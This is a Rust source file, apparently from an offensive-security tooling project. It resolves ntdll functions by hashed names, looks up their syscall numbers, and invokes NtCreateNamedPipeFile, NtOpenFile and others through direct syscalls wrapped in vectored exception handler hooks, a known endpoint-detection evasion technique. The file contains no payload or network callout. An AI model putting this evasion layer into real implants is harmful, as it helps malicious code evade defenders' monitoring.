use core::{
    ffi::{c_ulong, c_void},
    ptr::null_mut,
};

use crate::{
    get_instance,
    libpressure::ldrapi::ldr_function,
    libpressure::hash::dbj2_hash,
    libpressure::ssn::get_ssn,
    libpressure::ntapi::veh::{veh_hooks, remove_veh_hooks},
    ssn_syscall,
};

use crate::data::structs::{
    IoStatusBlock, LargeInteger, ObjectAttributes, UnicodeString,
};



pub struct NtSyscall {
    //number of the syscall
    pub number: u16,
    //its addrress
    pub address: *mut u8,
    //hash for lookup
    pub hash: usize,
}

unsafe impl Sync for NtSyscall {}

impl NtSyscall {
    pub const fn new(hash: usize) -> Self {
        NtSyscall {
            number: 0,
            address: null_mut(),
            hash,
        }
    }
}

/// Type definition for the LdrLoadDll function.
///
/// Loads a DLL into the address space of the calling process.
///
/// # Parameters
/// - `[in, opt]` - `DllPath`: A pointer to a `UNICODE_STRING` that specifies the fully qualified path of the DLL to load. This can be `NULL`, in which case the system searches for the DLL.
/// - `[in, opt]` - `DllCharacteristics`: A pointer to a variable that specifies the DLL characteristics (optional, can be `NULL`).
/// - `[in]` - `DllName`: A `UNICODE_STRING` that specifies the name of the DLL to load.
/// - `[out]` - `DllHandle`: A pointer to a variable that receives the handle to the loaded DLL.
///
/// # Returns
/// - `i32` - The NTSTATUS code of the operation.
type LdrLoadDll = unsafe extern "system" fn(
    DllPath: *mut u16,
    DllCharacteristics: *mut u32,
    DllName: UnicodeString,
    DllHandle: *mut c_void,
) -> i32;

pub struct NtDll {
    pub module_base: *mut u8,
    pub ldr_load_dll: LdrLoadDll,
    pub nt_allocate_virtual_memory: NtAllocateVirtualMemory,
    pub nt_free_virtual_memory: NtFreeVirtualMemory,
    pub nt_close: NtClose,
    pub nt_create_named_pipe: NtCreateNamedPipeFile,
    pub nt_open_file: NtOpenFile,

    //ntdll functions grow here
}

impl NtDll {
    pub fn new() -> Self {
        NtDll {
            module_base: null_mut(),
            ldr_load_dll: unsafe { core::mem::transmute(null_mut::<c_void>()) },
            nt_allocate_virtual_memory: NtAllocateVirtualMemory::new(),
            nt_free_virtual_memory: NtFreeVirtualMemory::new(),
            nt_close: NtClose::new(),
            nt_create_named_pipe: NtCreateNamedPipeFile::new(),
            nt_open_file: NtOpenFile::new(),

            //implementations grow here sequentially
        }
    }
}

pub fn init_ntdll_funcs() {
    unsafe {
       
        const LDR_LOAD_DLL_HASH: usize = dbj2_hash(b"LdrLoadDll\0") as usize;

        let instance = get_instance().unwrap();


        //NtAllocateVirtualMemory
        instance.ntdll.nt_allocate_virtual_memory.syscall.address = ldr_function(
            instance.ntdll.module_base,
            instance.ntdll.nt_allocate_virtual_memory.syscall.hash,
        );
        instance.ntdll.nt_allocate_virtual_memory.syscall.number = 
            get_ssn(instance.ntdll.nt_allocate_virtual_memory.syscall.address);
        
        //NtFreeVirtualMemory
        instance.ntdll.nt_free_virtual_memory.syscall.address = ldr_function(
            instance.ntdll.module_base,
            instance.ntdll.nt_free_virtual_memory.syscall.hash,
        );
        instance.ntdll.nt_free_virtual_memory.syscall.number =
            get_ssn(instance.ntdll.nt_free_virtual_memory.syscall.address);

        // NtClose
        instance.ntdll.nt_close.syscall.address = ldr_function(
            instance.ntdll.module_base,
            instance.ntdll.nt_close.syscall.hash,
        );
        instance.ntdll.nt_close.syscall.number = get_ssn(instance.ntdll.nt_close.syscall.address);

        // NtCreateNamedPipe
        instance.ntdll.nt_create_named_pipe.syscall.address = ldr_function(
            instance.ntdll.module_base,
            instance.ntdll.nt_create_named_pipe.syscall.hash,
        );
        instance.ntdll.nt_create_named_pipe.syscall.number =
            get_ssn(instance.ntdll.nt_create_named_pipe.syscall.address);

        // NtOpenFile
        instance.ntdll.nt_open_file.syscall.address = ldr_function(
            instance.ntdll.module_base,
            instance.ntdll.nt_open_file.syscall.hash,
        );
        instance.ntdll.nt_open_file.syscall.number =
            get_ssn(instance.ntdll.nt_open_file.syscall.address);

        // LdrLoadDll
        let ldr_load_dll_addr = ldr_function(instance.ntdll.module_base, LDR_LOAD_DLL_HASH);
        instance.ntdll.ldr_load_dll = core::mem::transmute(ldr_load_dll_addr);

    }
}


pub struct NtAllocateVirtualMemory {
    pub syscall: NtSyscall,
}

unsafe impl Sync for NtAllocateVirtualMemory {}

impl NtAllocateVirtualMemory {
    pub const fn new() -> Self {
        let hash = dbj2_hash(b"NtAllocateVirtualMemory") as usize;
        NtAllocateVirtualMemory {
            syscall: NtSyscall::new(hash),
        }

    }
}

pub struct NtFreeVirtualMemory {
    pub syscall: NtSyscall,
}

unsafe impl Sync for NtFreeVirtualMemory {}

impl NtFreeVirtualMemory {
    pub const fn new() -> Self {
        let hash = dbj2_hash(b"NtFreeVirtualMemory") as usize;
        NtFreeVirtualMemory {
            syscall: NtSyscall::new(hash),
        }
    }
}

pub struct NtClose {
    pub syscall: NtSyscall,
}

unsafe impl Sync for NtClose {}

impl NtClose {
    pub const fn new() -> Self {
        let hash = dbj2_hash(b"NtClose") as usize;
        NtClose {
            syscall: NtSyscall::new(hash),
        }
    }

    /// Wrapper function for NtClose to avoid repetitive ssn_syscall calls.
    ///
    /// # Arguments
    ///
    /// * `[in]` - `handle` A handle to an object. This is a required parameter that must be valid.
    ///   It represents the handle that will be closed by the function.
    ///
    /// # Returns
    ///
    /// * `i32` - The NTSTATUS code of the operation, indicating success or failure of the syscall.
    pub fn run(&self, handle: *mut c_void) -> i32 {

        veh_hooks();

        let result = ssn_syscall!(self.syscall.number, self.syscall.address as usize, handle);

        remove_veh_hooks();

        result
    }
}

pub struct NtCreateNamedPipeFile {
    pub syscall: NtSyscall,
}

unsafe impl Sync for NtCreateNamedPipeFile {}

impl NtCreateNamedPipeFile {
    pub const fn new() -> Self {
        let hash = dbj2_hash(b"NtCreateNamedPipeFile") as usize;
        NtCreateNamedPipeFile {
            syscall: NtSyscall::new(hash),
        }
    }

    /// Wrapper for the NtCreateNamedPipeFile syscall.
    ///
    /// This function creates a named pipe file and returns a handle to it.
    ///
    /// # Arguments
    ///
    /// * `[out]` - `file_handle` A mutable pointer to a handle that will receive the file handle.
    /// * `[in]` - `desired_access` The desired access rights for the named pipe file.
    /// * `[in]` - `object_attributes` A pointer to an `OBJECT_ATTRIBUTES` structure that specifies the object attributes.
    /// * `[out]` - `io_status_block` A pointer to an `IO_STATUS_BLOCK` structure that receives the status of the I/O operation.
    /// * `[in]` - `share_access` The requested sharing mode of the file.
    /// * `[in]` - `create_disposition` Specifies the action to take on files that exist or do not exist.
    /// * `[in]` - `create_options` Specifies the options to apply when creating or opening the file.
    /// * `[in]` - `named_pipe_type` Specifies the type of named pipe (byte stream or message).
    /// * `[in]` - `read_mode` Specifies the read mode for the pipe.
    /// * `[in]` - `completion_mode` Specifies the completion mode for the pipe.
    /// * `[in]` - `maximum_instances` The maximum number of instances of the pipe.
    /// * `[in]` - `inbound_quota` The size of the input buffer, in bytes.
    /// * `[in]` - `outbound_quota` The size of the output buffer, in bytes.
    /// * `[in, opt]` - `default_timeout` A pointer to a `LARGE_INTEGER` structure that specifies the default time-out value.
    ///
    /// # Returns
    ///
    /// * `i32` - The NTSTATUS code of the operation.
    pub fn run(
        &self,
        file_handle: *mut *mut c_void,
        desired_access: c_ulong,
        object_attributes: *mut ObjectAttributes,
        io_status_block: *mut IoStatusBlock,
        share_access: c_ulong,
        create_disposition: c_ulong,
        create_options: c_ulong,
        named_pipe_type: c_ulong,
        read_mode: c_ulong,
        completion_mode: c_ulong,
        maximum_instances: c_ulong,
        inbound_quota: c_ulong,
        outbound_quota: c_ulong,
        default_timeout: *const LargeInteger,
    ) -> i32 {

        veh_hooks();

       let result =  ssn_syscall!(
            self.syscall.number,
            self.syscall.address as usize,
            file_handle,
            desired_access,
            object_attributes,
            io_status_block,
            share_access,
            create_disposition,
            create_options,
            named_pipe_type,
            read_mode,
            completion_mode,
            maximum_instances,
            inbound_quota,
            outbound_quota,
            default_timeout
        );

        remove_veh_hooks();
        result
    }
}

pub struct NtOpenFile {
    pub syscall: NtSyscall,
}

unsafe impl Sync for NtOpenFile {}

impl NtOpenFile {
    pub const fn new() -> Self {
        let hash = dbj2_hash(b"NtOpenFile") as usize;
        NtOpenFile {
            syscall: NtSyscall::new(hash),
        }
    }

    /// Wrapper for the NtOpenFile syscall.
    ///
    /// This function opens a file and returns a handle to it.
    ///
    /// # Arguments
    ///
    /// * `[out]` - `file_handle` A mutable pointer to a handle that will receive the file handle.
    /// * `[in]` - `desired_access` The desired access rights for the file.
    /// * `[in]` - `object_attributes` A pointer to an `OBJECT_ATTRIBUTES` structure that specifies the object attributes.
    /// * `[out]` - `io_status_block` A pointer to an `IO_STATUS_BLOCK` structure that receives the status of the I/O operation.
    /// * `[in]` - `share_access` The requested sharing mode of the file.
    /// * `[in]` - `open_mode` Specifies how to open the file (e.g., open, create, overwrite).
    /// 
    /// # Returns
    /// 
    /// * `i32` - The NTSTATUS code of the operation.
    pub fn run(
        &self,
        file_handle: *mut *mut c_void,
        desired_access: c_ulong,
        object_attributes: *mut ObjectAttributes,
        io_status_block: *mut IoStatusBlock,
        share_access: c_ulong,
        open_options: c_ulong,
    ) -> i32 {
        veh_hooks();
        let result = ssn_syscall!(
            self.syscall.number,
            self.syscall.address as usize,
            file_handle,
            desired_access,
            object_attributes,
            io_status_block,
            share_access,
            open_options
        );

        remove_veh_hooks();
        result
    }
}



